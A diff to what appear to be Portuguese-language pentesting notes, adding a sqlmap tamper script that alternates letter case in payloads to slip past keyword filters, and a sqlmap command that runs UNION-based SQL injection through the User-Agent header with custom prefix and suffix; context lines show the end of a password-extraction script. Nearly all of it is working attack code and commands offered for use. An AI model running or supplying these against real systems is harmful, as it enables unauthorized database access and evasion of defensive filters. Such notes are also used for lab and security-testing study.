@@ -26,3 +26,39 @@ for position in range(1,21):
             break
 print(f"Pass: {password}")
 ```
+### Script para bypass de filtro palavras
+```
+#!/usr/bin/env python
+from lib.core.enums import PRIORITY
+
+__priority__ = PRIORITY.NORMAL
+
+def dependencies():
+    pass
+
+def tamper(payload, **kwargs):
+    """
+    Replaces each keyword a CaMeLcAsE VeRsIoN of it.
+
+    >>> tamper('INSERT')
+    'InSeRt'
+    """
+
+    retVal = str()
+
+    if payload:
+        for i in xrange(len(payload)):
+            if (i % 2 == 0):
+                # We cannot break 0x12345
+                if not ((payload[i] == 'x') and (payload[i-1] == '0')):
+                    retVal += payload[i].upper()
+                else:
+                    retVal += payload[i]
+            else:
+                retVal += payload[i].lower()
+    return retVal
+```
+   
+### Execução do script 
+
+```sqlmap -u 'http://[URL]/' -p user-agent --technique=U --tamper=/path/to/your/tampering/scripts/camelcase.py --prefix="nonexistent'" --suffix=';#' --union-char=els --banner```
